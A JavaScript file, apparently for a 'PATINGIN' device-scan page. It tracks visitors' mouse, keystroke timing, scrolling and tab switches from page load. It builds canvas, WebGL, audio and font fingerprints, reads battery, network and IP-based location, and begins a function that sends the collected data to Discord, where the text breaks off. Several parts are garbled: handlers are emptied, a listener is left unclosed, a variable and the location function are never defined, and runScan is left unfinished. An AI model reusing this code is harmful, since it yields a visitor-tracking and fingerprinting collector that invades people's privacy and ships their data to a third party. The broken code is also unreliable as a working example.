// ═══════════════════════════════════════════════════════════════════════════════
// BEHAVIORAL TRACKING — starts immediately so data accumulates during scan

const _beh = {
  mouseMoves: 0, lastMousePos: null,
  clicks: 0, scrollDepth: 0,
  keyCount: 0, keyTimings: [], _lastKey: 0,
  tabSwitches: 0, startTime: Date.now(),
};
document.addEventListener('mousemove', e => {
  _beh.mouseMoves++;

});
document.addEventListener('click', () => _beh.clicks++);
window.addEventListener('scroll', () => {

document.addEventListener('keydown', () => {
  _beh.keyCount++;

  _beh._lastKey = now;
});
document.addEventListener('visibilitychange', () => { if (document.hidden) _beh.tabSwitches++; });

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function withTimeout(ms) {
  if (typeof AbortSignal.timeout === 'function') return AbortSignal.timeout(ms);
  const c = new AbortController();
  setTimeout(() => c.abort(), ms);

}

async function runScan() {

// ═══════════════════════════════════════════════════════════════════════════════
// HASH UTILITY
// ═══════════════════════════════════════════════════════════════════════════════
function simpleHash(str) {
  let h = 5381;
  for (let i = 0; i < str.length; i++) h = (((h << 5) + h) ^ str.charCodeAt(i)) & 0xffffffff;
  return (h >>> 0).toString(16).toUpperCase().padStart(8, '0');
}

// ═══════════════════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════════════════
// WEBGL FINGERPRINT
// ═══════════════════════════════════════════════════════════════════════════════
function getWebGL() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return { renderer:'Not supported', vendor:'N/A', version:'N/A', exts:0, hash:null };
    const dbg      = gl.getExtension('WEBGL_debug_renderer_info');
    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Hidden by browser';
    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : 'Hidden by browser';
    const version  = gl.getParameter(gl.VERSION) || 'Unknown';
    const exts     = gl.getSupportedExtensions()?.length ?? 0;
    const shaderV  = gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || '';
    const hash     = simpleHash(renderer + vendor + version + exts + shaderV);
    return { renderer, vendor, version, exts, shaderV, hash };
  } catch { return { renderer:'Error', vendor:'N/A', version:'N/A', exts:0, hash:null }; }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CANVAS FINGERPRINT
// ═══════════════════════════════════════════════════════════════════════════════
function getCanvasFingerprint() {
  try {
    const c = document.createElement('canvas');
    c.width = 240; c.height = 70;
    const ctx = c.getContext('2d');
    // Background gradient
    const g = ctx.createLinearGradient(0, 0, 240, 0);
    g.addColorStop(0, '#0a0a0f'); g.addColorStop(1, '#0d1a12');
    ctx.fillStyle = g; ctx.fillRect(0, 0, 240, 70);
    // Colored rectangle
    ctx.fillStyle = '#ff6600'; ctx.fillRect(130, 5, 60, 18);
    // Text with specific fonts
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#069';
    ctx.font = '11pt "not-real-xfont", Arial, sans-serif';
    ctx.fillText('PATINGIN 🔍 <canvas> v2', 2, 20);
    ctx.fillStyle = 'rgba(0, 255, 136, 0.75)';
    ctx.font = 'bold 16pt Arial';
    ctx.fillText('DEVICE ID', 4, 52);
    // Bezier for sub-pixel rendering differences
    ctx.beginPath();
    ctx.moveTo(0, 65); ctx.bezierCurveTo(60, 10, 160, 65, 240, 15);
    ctx.strokeStyle = '#00ffcc'; ctx.lineWidth = 1.3; ctx.stroke();
    // Arc
    ctx.beginPath();
    ctx.arc(200, 35, 20, 0, Math.PI * 1.5);
    ctx.strokeStyle = 'rgba(255,170,0,0.8)'; ctx.lineWidth = 2; ctx.stroke();
    return simpleHash(c.toDataURL());
  } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════════════════════
// AUDIO FINGERPRINT
// ═══════════════════════════════════════════════════════════════════════════════
async function getAudioFingerprint() {
  try {
    const ctx = new OfflineAudioContext(1, 44100, 44100);
    const osc = ctx.createOscillator();
    const cmp = ctx.createDynamicsCompressor();
    [['threshold',-50],['knee',40],['ratio',12],['attack',0],['release',0.25]]
      .forEach(([k,v]) => cmp[k].setValueAtTime(v, ctx.currentTime));
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(10000, ctx.currentTime);
    osc.connect(cmp); cmp.connect(ctx.destination);
    osc.start(0);
    const buf  = await ctx.startRendering();
    const data = buf.getChannelData(0);
    let sum = 0;
    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
    return simpleHash(sum.toString());
  } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════════════════════
// FONT DETECTION (canvas width method)
// ═══════════════════════════════════════════════════════════════════════════════
function detectFonts() {
  const TEST_STR  = 'mmmmmmmmmmlli';
  const BASE      = 'monospace';
  const c         = document.createElement('canvas').getContext('2d');
  c.font          = `72px ${BASE}`;
  const baseW     = c.measureText(TEST_STR).width;
  const LIST = [
    'Arial','Arial Black','Arial Narrow','Calibri','Cambria','Comic Sans MS',
    'Consolas','Courier New','Georgia','Helvetica','Impact','Lucida Console',
    'Lucida Sans Unicode','Microsoft Sans Serif','Palatino Linotype','Segoe UI',
    'Tahoma','Times New Roman','Trebuchet MS','Verdana','Gill Sans MT',
    'Century Gothic','Franklin Gothic Medium','Garamond','Bookman Old Style',
    'Rockwell','Noto Sans','Roboto','Open Sans','Lato','Montserrat',
    'Source Code Pro','Fira Code','JetBrains Mono','Ubuntu',
  ];
  return LIST.filter(f => {
    c.font = `72px '${f}', ${BASE}`;
    return c.measureText(TEST_STR).width !== baseW;
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// AD BLOCKER DETECTION
// ═══════════════════════════════════════════════════════════════════════════════
async function detectAdBlocker() {
  try {
    const el = document.createElement('div');
    el.setAttribute('class', 'ad-banner adsbox pub_300x250 advertisement banner-ads');
    el.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;pointer-events:none;';
    document.body.appendChild(el);
    await sleep(120);
    const blocked = !el.offsetParent || el.offsetHeight === 0 ||
                    getComputedStyle(el).display === 'none' ||
                    getComputedStyle(el).visibility === 'hidden';
    document.body.removeChild(el);
    return blocked;
  } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════════════════════
// STORAGE SUPPORT
// ═══════════════════════════════════════════════════════════════════════════════
function getStorageSupport() {
  const test = (fn) => { try { fn(); return true; } catch { return false; } };
  return {
    localStorage:   test(() => { localStorage.setItem('_pt','1'); localStorage.removeItem('_pt'); }),
    sessionStorage: test(() => { sessionStorage.setItem('_pt','1'); sessionStorage.removeItem('_pt'); }),
    indexedDB:      !!window.indexedDB,
    cacheAPI:       !!window.caches,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// STORAGE QUOTA
// ═══════════════════════════════════════════════════════════════════════════════
async function getStorageQuota() {
  try {
    if (navigator.storage?.estimate) {
      const e = await navigator.storage.estimate();
      return {
        used:  (e.usage  / 1048576).toFixed(1) + ' MB',
        quota: (e.quota  / 1073741824).toFixed(2) + ' GB'
      };
    }
  } catch {}
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════════
// BATTERY
// ═══════════════════════════════════════════════════════════════════════════════
async function getBattery() {
  try {
    if (!navigator.getBattery) return null;
    const b = await navigator.getBattery();
    const t = s => (!isFinite(s) || s <= 0) ? null :
      (Math.floor(s/3600) ? Math.floor(s/3600)+'h ' : '') + Math.floor((s%3600)/60)+'m';
    return { level:(b.level*100).toFixed(0)+'%', charging:b.charging,
             timeToFull:t(b.chargingTime), timeToEmpty:t(b.dischargingTime) };
  } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════════════════════
// NETWORK CONNECTION
// ═══════════════════════════════════════════════════════════════════════════════
function getConnection() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return null;
  return {
    type:     c.effectiveType || c.type || 'Unknown',
    downlink: c.downlink  != null ? c.downlink  + ' Mbps' : null,
    rtt:      c.rtt       != null ? c.rtt       + ' ms'   : null,
    saveData: c.saveData,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// MEDIA CODECS
// ═══════════════════════════════════════════════════════════════════════════════
function getMediaCodecs() {
  const v = document.createElement('video');
  const a = document.createElement('audio');
  const can = (el, t) => { const r = el.canPlayType(t); return r === 'probably' ? '✓' : r === 'maybe' ? '~' : '✗'; };
  return {
    video: {
      'H.264':  can(v, 'video/mp4; codecs="avc1.42E01E"'),
      'H.265':  can(v, 'video/mp4; codecs="hvc1"'),
      'VP8':    can(v, 'video/webm; codecs="vp8"'),
      'VP9':    can(v, 'video/webm; codecs="vp9"'),
      'AV1':    can(v, 'video/mp4; codecs="av01.0.05M.08"'),
      'WebM':   can(v, 'video/webm'),
    },
    audio: {
      'MP3':    can(a, 'audio/mpeg'),
      'AAC':    can(a, 'audio/aac'),
      'OGG':    can(a, 'audio/ogg; codecs="vorbis"'),
      'FLAC':   can(a, 'audio/flac'),
      'Opus':   can(a, 'audio/webm; codecs="opus"'),
      'WAV':    can(a, 'audio/wav'),
    }
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// BROWSER FEATURES
// ═══════════════════════════════════════════════════════════════════════════════
function getBrowserFeatures() {
  return {
    pdfViewer:     navigator.pdfViewerEnabled ?? !!(navigator.mimeTypes?.['application/pdf']),
    serviceWorker: 'serviceWorker' in navigator,
    pwa:           window.matchMedia('(display-mode: standalone)').matches || !!navigator.standalone,
    webRTC:        !!window.RTCPeerConnection,
    webAssembly:   typeof WebAssembly === 'object',
    webSockets:    typeof WebSocket   === 'function',
    notifications: 'Notification' in window,
    notifPerm:     'Notification' in window ? Notification.permission : 'N/A',
    geolocation:   'geolocation'   in navigator,
    mediaDevices:  !!navigator.mediaDevices,
    bluetooth:     'bluetooth'  in navigator,
    usb:           'usb'        in navigator,
    shareAPI:      !!navigator.share,
    clipboard:     !!navigator.clipboard,
    pointerLock:   !!document.pointerLockElement !== undefined,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// DISPLAY PREFERENCES
// ═══════════════════════════════════════════════════════════════════════════════
function getDisplayPrefs() {
  const mq = q => window.matchMedia(q).matches;
  return {
    darkMode:      mq('(prefers-color-scheme: dark)'),
    reducedMotion: mq('(prefers-reduced-motion: reduce)'),
    highContrast:  mq('(prefers-contrast: more)'),
    hdr:           mq('(dynamic-range: high)'),
    p3:            mq('(color-gamut: p3)'),
    rec2020:       mq('(color-gamut: rec2020)'),
    sRGB:          mq('(color-gamut: srgb)'),
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// PERFORMANCE
// ═══════════════════════════════════════════════════════════════════════════════
function measureJS() {
  const t0 = performance.now();
  let x = 0;
  for (let i = 0; i < 500000; i++) x += Math.sqrt(i);
  const ms = (performance.now() - t0).toFixed(1);
  return { ms, rating: ms < 30 ? '🚀 Fast' : ms < 80 ? '✅ Normal' : '🐢 Slow' };
}

async function measureFPS() {
  return new Promise(resolve => {
    let count = 0;
    const t0 = performance.now();
    const frame = () => {
      count++;
      performance.now() - t0 < 1000 ? requestAnimationFrame(frame) : resolve(count);
    };
    requestAnimationFrame(frame);
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// UA PARSING — OS, browser, device type, arch, model
// ═══════════════════════════════════════════════════════════════════════════════
function parseUA(ua) {
  // OS
  let os = 'Unknown', osVer = '';
  if      (/Windows NT 10/  .test(ua)) { os = 'Windows'; osVer = '10 / 11'; }
  else if (/Windows NT 6\.3/.test(ua)) { os = 'Windows'; osVer = '8.1'; }
  else if (/Windows NT 6\.1/.test(ua)) { os = 'Windows'; osVer = '7'; }
  else if (/Windows/        .test(ua)) { os = 'Windows'; }
  else if (/Android/        .test(ua)) { os = 'Android'; osVer = ua.match(/Android ([0-9.]+)/)?.[1] || ''; }
  else if (/iPhone|iPad|iPod/.test(ua)){ os = 'iOS';     osVer = ua.match(/OS ([0-9_]+)/)?.[1]?.replace(/_/g,'.') || ''; }
  else if (/Mac OS X/       .test(ua)) { os = 'macOS';   osVer = ua.match(/Mac OS X ([0-9_]+)/)?.[1]?.replace(/_/g,'.') || ''; }
  else if (/CrOS/           .test(ua)) { os = 'ChromeOS'; }
  else if (/Linux/          .test(ua)) { os = 'Linux'; }

  // Browser
  let browser = 'Unknown', bVer = '';
  if      (/Edg\/   /.test(ua)) { browser = 'Edge';    bVer = ua.match(/Edg\/([\d.]+)/)?.[1]    || ''; }
  else if (/OPR\/   /.test(ua)) { browser = 'Opera';   bVer = ua.match(/OPR\/([\d.]+)/)?.[1]    || ''; }
  else if (/SamsungBrowser/.test(ua)) { browser='Samsung'; bVer=ua.match(/SamsungBrowser\/([\d.]+)/)?.[1]||''; }
  else if (/Chrome\/ /.test(ua)) { browser = 'Chrome';  bVer = ua.match(/Chrome\/([\d.]+)/)?.[1] || ''; }
  else if (/Firefox\//.test(ua)) { browser = 'Firefox'; bVer = ua.match(/Firefox\/([\d.]+)/)?.[1]|| ''; }
  else if (/Safari\/ /.test(ua)) { browser = 'Safari';  bVer = ua.match(/Version\/([\d.]+)/)?.[1]|| ''; }
  // Fix regex — remove extra spaces
  browser = browser; // reassign cleanly below
  if (/Edg\//.test(ua))          { browser='Edge';    bVer=ua.match(/Edg\/([\d.]+)/)?.[1]||''; }
  else if (/OPR\//.test(ua))     { browser='Opera';   bVer=ua.match(/OPR\/([\d.]+)/)?.[1]||''; }
  else if (/SamsungBrowser/.test(ua)){ browser='Samsung'; bVer=ua.match(/SamsungBrowser\/([\d.]+)/)?.[1]||''; }
  else if (/Chrome\//.test(ua))  { browser='Chrome';  bVer=ua.match(/Chrome\/([\d.]+)/)?.[1]||''; }
  else if (/Firefox\//.test(ua)) { browser='Firefox'; bVer=ua.match(/Firefox\/([\d.]+)/)?.[1]||''; }
  else if (/Safari\//.test(ua))  { browser='Safari';  bVer=ua.match(/Version\/([\d.]+)/)?.[1]||''; }

  // Device type
  let deviceType = 'Desktop';
  if (/iPad/.test(ua) || (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1)) deviceType = 'Tablet';
  else if (/Mobi|Android|iPhone|iPod/.test(ua)) deviceType = 'Mobile';

  // CPU arch
  let arch = 'Unknown';
  if      (/arm64|aarch64/i.test(ua))        arch = 'ARM64';
  else if (/armv7|armv8/i.test(ua))          arch = 'ARM 32-bit';
  else if (/x86_64|Win64|WOW64|amd64/i.test(ua)) arch = 'x86-64';
  else if (/x86/i.test(ua))                  arch = 'x86 (32-bit)';

  // Model clues
  let model = 'Unknown';
  if (/iPhone/.test(ua))      model = 'iPhone (model hidden by iOS)';
  else if (/iPad/.test(ua))   model = 'iPad (model hidden by iOS)';
  else {
    const m = ua.match(/\(Linux;[^)]*?;\s*([^);/]+(?:\s+[^);/]+)*)\s*(?:Build|[);])/);
    if (m && m[1] && !/Android/.test(m[1])) model = m[1].trim();
    else if (/Windows NT 10/.test(ua)) model = 'Windows PC';
    else if (/Macintosh/.test(ua))     model = 'Mac (model hidden by macOS)';
    else if (/CrOS/.test(ua))          model = 'Chromebook';
    else if (/Linux/.test(ua))         model = 'Linux Device';
  }

  return { os, osVer, browser, bVer, deviceType, arch, model };
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMBINED FINGERPRINT
// ═══════════════════════════════════════════════════════════════════════════════
function buildFingerprint(parts) {
  return simpleHash(JSON.stringify(parts));
}

// ═══════════════════════════════════════════════════════════════════════════════
// GRID HELPERS
// ═══════════════════════════════════════════════════════════════════════════════
let _grid = null;
const _data = {};

function section(t) {
  const s = document.createElement('div');
  s.className = 'section-label';
  s.textContent = '— ' + t + ' —';
  _grid.appendChild(s);
}
function row(label, val, type = '', note = '') {
  _data[label] = String(val ?? '') + (note ? ` (${note})` : '');
  const r = document.createElement('div');
  r.className = 'info-row' + (type ? ' ' + type : '');
  r.innerHTML = `
    <span class="info-label">${label}</span>
    <span class="info-right">
      <div class="info-val">${val ?? '—'}</div>
      ${note ? `<div class="info-note">${note}</div>` : ''}
    </span>`;
  _grid.appendChild(r);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SHOW RESULTS
// ═══════════════════════════════════════════════════════════════════════════════
async function showResults() {
  const ua    = navigator.userAgent;
  const pua   = parseUA(ua);
  const webgl = getWebGL();
  const prefs = getDisplayPrefs();
  const store = getStorageSupport();
  const feats = getBrowserFeatures();
  const codec = getMediaCodecs();
  const conn  = getConnection();
  const js    = measureJS();

  // Async batch — all run concurrently
  const [ipLoc, battery, quota, canvasFP, audioFP, adBlocked, fps] = await Promise.all([
    getIPLocation(),
    getBattery(),
    getStorageQuota(),
    Promise.resolve(getCanvasFingerprint()),
    getAudioFingerprint(),
    detectAdBlocker(),
    measureFPS(),
  ]);

  const fonts = detectFonts();

  // Location confidence
  let locConf = null;
  if (ipLoc) {
    const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone.toLowerCase();
    const lang = (navigator.language || '').split('-')[1]?.toUpperCase() || '';
    let m = 0, s = 0;
    if (tz && ipLoc.city)        { s++; if (tz.includes((ipLoc.city||'').toLowerCase().split(' ')[0])) m++; }
    if (lang && ipLoc.countryCode){ s++; if (lang === ipLoc.countryCode.toUpperCase()) m++; }
    locConf = s === 0 ? 'Low' : (m / s >= 1 ? 'High' : m / s >= 0.5 ? 'Medium' : 'Low');
  }

  // Combined fingerprint
  const fp = buildFingerprint({
    ua, os: pua.os, browser: pua.browser, bVer: pua.bVer,
    screen: `${screen.width}x${screen.height}`,
    dpr: window.devicePixelRatio,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    cores: navigator.hardwareConcurrency,
    ram: navigator.deviceMemory,
    gpu: webgl.renderer,
    canvas: canvasFP,
    audio: audioFP,
    fonts: fonts.join(','),
    colorDepth: screen.colorDepth,
    touch: navigator.maxTouchPoints,
    prefs: JSON.stringify(prefs),
  });

  // ── Switch screens ─────────────────────────────────────────────────────────
  document.getElementById('scanScreen').style.display = 'none';
  document.getElementById('doneScreen').style.display = 'block';
  _grid = document.getElementById('infoGrid');

  // ── DEVICE ─────────────────────────────────────────────────────────────────
  section('DEVICE');
  row('Device Type',     pua.deviceType === 'Mobile' ? '📱 Mobile' : pua.deviceType === 'Tablet' ? '📲 Tablet' : '🖥️ Desktop');
  row('Model / Clues',   pua.model, pua.model.includes('hidden') || pua.model === 'Unknown' ? 'limited' : '');
  row('Operating System',pua.os + (pua.osVer ? ' ' + pua.osVer : ''));
  row('Platform String', navigator.platform || 'Unknown', navigator.platform ? '' : 'unavailable');
  row('CPU Architecture',pua.arch, pua.arch === 'Unknown' ? 'limited' : '', pua.arch === 'Unknown' ? 'Not exposed' : '');

  // ── HARDWARE ───────────────────────────────────────────────────────────────
  section('HARDWARE');
  const ram   = navigator.deviceMemory;
  const cores = navigator.hardwareConcurrency;
  row('Approx RAM',    ram   ? ram  + ' GB'       : 'Not available', ram   ? 'limited'     : 'unavailable', ram   ? 'Browser rounds to bucket' : 'Blocked');
  row('CPU Cores',     cores ? cores+ ' logical'  : 'Not available', cores ? ''             : 'unavailable', 'Virtual/logical, not physical');
  row('GPU Renderer',  webgl.renderer, ['Not supported','Hidden by browser','Error'].includes(webgl.renderer) ? 'limited' : '');
  row('GPU Vendor',    webgl.vendor,   ['N/A','Hidden by browser','Unknown'].includes(webgl.vendor) ? 'limited' : '');
  row('WebGL Version', webgl.version);
  row('GLSL Version',  webgl.shaderV || 'N/A', 'limited');
  row('GL Extensions', webgl.exts != null ? webgl.exts + ' supported' : 'N/A', 'limited');

  // ── DISPLAY ────────────────────────────────────────────────────────────────
  section('DISPLAY');
  row('Screen Resolution', `${screen.width} × ${screen.height} px`);
  row('Available Screen',  `${screen.availWidth} × ${screen.availHeight} px`, 'limited', 'Excludes taskbar/dock');
  row('Viewport Size',     `${window.innerWidth} × ${window.innerHeight} px`);
  row('Window Outer Size', `${window.outerWidth} × ${window.outerHeight} px`);
  row('Pixel Ratio (DPR)', window.devicePixelRatio + 'x');
  row('Color Depth',       screen.colorDepth + '-bit');
  row('Orientation',       screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait'));
  row('Touch Support',     navigator.maxTouchPoints > 0 ? '✅ Yes' : '❌ No');
  row('Max Touch Points',  navigator.maxTouchPoints);
  row('HDR Support',       prefs.hdr     ? '✅ Yes' : '❌ No');
  row('Color Gamut sRGB',  prefs.sRGB    ? '✅ Yes' : '❌ No');
  row('Color Gamut P3',    prefs.p3      ? '✅ Yes' : '❌ No');
  row('Color Gamut Rec2020',prefs.rec2020? '✅ Yes' : '❌ No');

  // ── PREFERENCES ───────────────────────────────────────────────────────────
  section('PREFERENCES');
  row('Color Scheme',    prefs.darkMode      ? '🌙 Dark'    : '☀️ Light');
  row('Reduced Motion',  prefs.reducedMotion ? '✅ Enabled' : '❌ Off');
  row('High Contrast',   prefs.highContrast  ? '✅ Enabled' : '❌ Off');

  // ── PERFORMANCE ───────────────────────────────────────────────────────────
  section('PERFORMANCE');
  row('JS Benchmark',  js.ms + ' ms',  '', '500k sqrt operations');
  row('CPU Speed Est.', js.rating);
  row('Frame Rate',    fps + ' FPS',   fps >= 55 ? '' : fps >= 29 ? 'limited' : 'unavailable', '1-second rAF count');
  row('Render Quality',fps >= 55 ? '🚀 Smooth (60fps+)' : fps >= 29 ? '✅ Normal (~30fps)' : '🐢 Slow (<30fps)');

  // ── STORAGE ───────────────────────────────────────────────────────────────
  section('STORAGE');
  row('Cookies',        navigator.cookieEnabled ? '✅ Enabled'    : '❌ Disabled');
  row('localStorage',   store.localStorage      ? '✅ Available'  : '❌ Blocked', store.localStorage   ? '' : 'unavailable');
  row('sessionStorage', store.sessionStorage     ? '✅ Available'  : '❌ Blocked', store.sessionStorage  ? '' : 'unavailable');
  row('IndexedDB',      store.indexedDB          ? '✅ Available'  : '❌ Blocked', store.indexedDB       ? '' : 'unavailable');
  row('Cache API',      store.cacheAPI           ? '✅ Available'  : '❌ Blocked', store.cacheAPI        ? '' : 'unavailable');
  if (quota) {
    row('Storage Used',  quota.used);
    row('Storage Quota', quota.quota, 'limited', 'Browser-allocated, not full disk');
  } else {
    row('Storage Quota', 'Not available', 'unavailable');
  }

  // ── BATTERY ───────────────────────────────────────────────────────────────
  section('BATTERY');
  if (battery) {
    row('Battery Level',  battery.level);
    row('Charging State', battery.charging ? '⚡ Charging' : '🔋 Discharging');
    if (battery.charging  && battery.timeToFull)  row('Time to Full',    battery.timeToFull);
    if (!battery.charging && battery.timeToEmpty) row('Time Remaining',  battery.timeToEmpty);
  } else {
    row('Battery API', 'Not accessible', 'unavailable', 'Not supported or blocked');
  }

  // ── NETWORK ───────────────────────────────────────────────────────────────
  section('NETWORK');
  row('Online Status', navigator.onLine ? '🟢 Online' : '🔴 Offline');
  if (conn) {
    row('Connection Type', conn.type.toUpperCase(), '', 'e.g. 4g, wifi, ethernet');
    if (conn.downlink) row('Est. Downlink',  conn.downlink);
    if (conn.rtt)      row('RTT / Latency',  conn.rtt);
    row('Data Saver',      conn.saveData ? '✅ On' : '❌ Off');
  } else {
    row('Network API', 'Not available', 'limited', 'Not supported by this browser');
  }

  // ── LOCATION ──────────────────────────────────────────────────────────────
  section('LOCATION (IP-BASED)');
  if (ipLoc) {
    row('Public IP',        ipLoc.ip, '', 'Outward-facing address');
    if (ipLoc.city)    row('City',       ipLoc.city,   'limited', 'IP estimate');
    if (ipLoc.region)  row('Region',     ipLoc.region, 'limited', 'IP estimate');
    if (ipLoc.country) row('Country',    ipLoc.country,'limited', 'IP estimate');
    if (ipLoc.postal)  row('Postal',     ipLoc.postal, 'limited', 'May not be exact');
    if (ipLoc.lat && ipLoc.lon)
      row('Approx Coords', `${Number(ipLoc.lat).toFixed(4)}, ${Number(ipLoc.lon).toFixed(4)}`, 'limited', 'City-level only');
    if (ipLoc.isp)  row('ISP / Org', ipLoc.isp);
    if (ipLoc.asn)  row('ASN',       ipLoc.asn);
    row('Confidence', locConf==='High'?'🟢 High':locConf==='Medium'?'🟡 Medium':'🔴 Low',
        locConf!=='High'?'limited':'', 'TZ + language cross-check');
  } else {
    row('IP Lookup', 'Failed', 'unavailable', 'Could not reach geolocation API');
  }

  // ── LOCALE ────────────────────────────────────────────────────────────────
  section('LOCALE');
  row('Language',       navigator.language || 'Unknown');
  row('All Languages',  (navigator.languages || []).join(', ') || 'Unknown', 'limited');
  row('Timezone',       Intl.DateTimeFormat().resolvedOptions().timeZone);
  row('Locale',         Intl.DateTimeFormat().resolvedOptions().locale || 'Unknown');
  row('Hour Cycle',     Intl.DateTimeFormat().resolvedOptions().hourCycle || 'Unknown', 'limited');
  row('Do Not Track',   navigator.doNotTrack === '1' ? '✅ Enabled' : '❌ Not set');

  // ── BROWSER ───────────────────────────────────────────────────────────────
  section('BROWSER');
  row('Browser',        pua.browser + ' ' + pua.bVer);
  row('Referrer',       document.referrer || 'None / Direct access', document.referrer ? '' : 'limited');
  row('History Length', history.length + ' pages', 'limited', 'Pages visited this session');
  row('Tab State',      document.hidden ? '⚠️ Background tab' : '✅ Active tab');

  // ── FINGERPRINTS ──────────────────────────────────────────────────────────
  section('FINGERPRINTS');
  row('Canvas FP',    canvasFP || 'Failed', canvasFP ? 'limited' : 'unavailable', 'Rendering fingerprint hash');
  row('WebGL FP',     webgl.hash || 'Failed', webgl.hash ? 'limited' : 'unavailable', 'GPU + driver hash');
  row('Audio FP',     audioFP  || 'Failed', audioFP  ? 'limited' : 'unavailable', 'AudioContext fingerprint hash');
  row('Fonts Found',  fonts.length ? `${fonts.length} detected` : 'None', 'limited',
      fonts.length ? fonts.slice(0, 5).join(', ') + (fonts.length > 5 ? ` +${fonts.length-5} more` : '') : '');
  row('Ad Blocker',   adBlocked === true ? '🛡️ Detected' : adBlocked === false ? '❌ Not detected' : '❓ Unknown');

  // ── MEDIA CODECS ──────────────────────────────────────────────────────────
  section('MEDIA CODECS');
  row('Video', Object.entries(codec.video).map(([k,v]) => `${k}${v}`).join('  '), 'limited', '✓=yes ~=maybe ✗=no');
  row('Audio', Object.entries(codec.audio).map(([k,v]) => `${k}${v}`).join('  '), 'limited', '✓=yes ~=maybe ✗=no');

  // ── BROWSER FEATURES ──────────────────────────────────────────────────────
  section('BROWSER FEATURES');
  row('PDF Viewer',     feats.pdfViewer     ? '✅ Built-in'       : '❌ No');
  row('Service Worker', feats.serviceWorker ? '✅ Supported'       : '❌ No');
  row('PWA Installed',  feats.pwa           ? '✅ Yes'             : '❌ No');
  row('WebRTC',         feats.webRTC        ? '✅ Supported'       : '❌ No');
  row('WebAssembly',    feats.webAssembly   ? '✅ Supported'       : '❌ No');
  row('WebSockets',     feats.webSockets    ? '✅ Supported'       : '❌ No');
  row('Notifications',  feats.notifications ? `✅ (${feats.notifPerm})` : '❌ No');
  row('Geolocation API',feats.geolocation   ? '✅ Present (not used)' : '❌ No');
  row('Media Devices',  feats.mediaDevices  ? '✅ Present'         : '❌ No');
  row('Web Bluetooth',  feats.bluetooth     ? '✅ Present'         : '❌ No');
  row('WebUSB',         feats.usb           ? '✅ Present'         : '❌ No');
  row('Web Share API',  feats.shareAPI      ? '✅ Present'         : '❌ No');
  row('Clipboard API',  feats.clipboard     ? '✅ Present'         : '❌ No');

  // ── BEHAVIORAL ───────────────────────────────────────────────────────────
  section('BEHAVIORAL');
  const elapsed  = ((Date.now() - _beh.startTime) / 1000).toFixed(0);
  const avgKey   = _beh.keyTimings.length > 1
    ? Math.round(_beh.keyTimings.reduce((a,b) => a+b, 0) / _beh.keyTimings.length)
    : null;
  row('Time on Page',     elapsed + ' seconds');
  row('Mouse Movements',  _beh.mouseMoves + ' events');
  row('Last Mouse Pos',   _beh.lastMousePos ? `(${_beh.lastMousePos[0]}, ${_beh.lastMousePos[1]})` : 'No movement detected', 'limited');
  row('Click Count',      _beh.clicks + ' clicks');
  row('Scroll Depth',     _beh.scrollDepth + '%', 'limited', 'Max reached');
  row('Key Presses',      _beh.keyCount + ' keys');
  row('Avg Key Interval', avgKey ? avgKey + ' ms' : 'N/A', avgKey ? 'limited' : 'unavailable', 'Typing rhythm estimate');
  row('Tab Switches',     _beh.tabSwitches + ' times');

  // ── COMBINED FINGERPRINT ──────────────────────────────────────────────────
  section('COMBINED FINGERPRINT');
  row('Device FP Hash', fp, 'limited', 'Stable across visits if hardware/browser unchanged');

  // Store UA last (it's very long)
  _data['User Agent'] = ua;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SEND TO DISCORD (chunked embeds, max 10 per call)
// ═══════════════════════════════════════════════════════════════════════════════
async function sendToDiscord() {
  const btn    = document.getElementById('sendBtn');
  const status = document.getElementById('sendStatus');
  btn.disabled = true;
  status.textContent = '⟩ SENDING...';
  status.className = '';

  const GROUP_DEFS = [
    { title:'📱 Device & Hardware',
      keys:['Device Type','Model / Clues','Operating System','Platform String','CPU Architecture',
            'Approx RAM','CPU Cores','GPU Renderer','GPU Vendor','WebGL Version','GLSL Version','GL Extensions'] },
    { title:'🖥️ Display & Preferences',
      keys:['Screen Resolution','Available Screen','Viewport Size','Window Outer Size','Pixel Ratio (DPR)',
            'Color Depth','Orientation','Touch Support','Max Touch Points',
            'HDR Support','Color Gamut sRGB','Color Gamut P3','Color Gamut Rec2020',
            'Color Scheme','Reduced Motion','High Contrast'] },
    { title:'⚡ Performance & Media',
      keys:['JS Benchmark','CPU Speed Est.','Frame Rate','Render Quality','Video','Audio'] },
    { title:'💾 Storage & Features',
      keys:['Cookies','localStorage','sessionStorage','IndexedDB','Cache API','Storage Used','Storage Quota',
            'PDF Viewer','Service Worker','PWA Installed','WebRTC','WebAssembly','WebSockets',
            'Notifications','Geolocation API','Media Devices','Web Bluetooth','WebUSB','Web Share API','Clipboard API'] },
    { title:'🔋 Battery & Network',
      keys:['Battery Level','Charging State','Time to Full','Time Remaining',
            'Online Status','Connection Type','Est. Downlink','RTT / Latency','Data Saver'] },
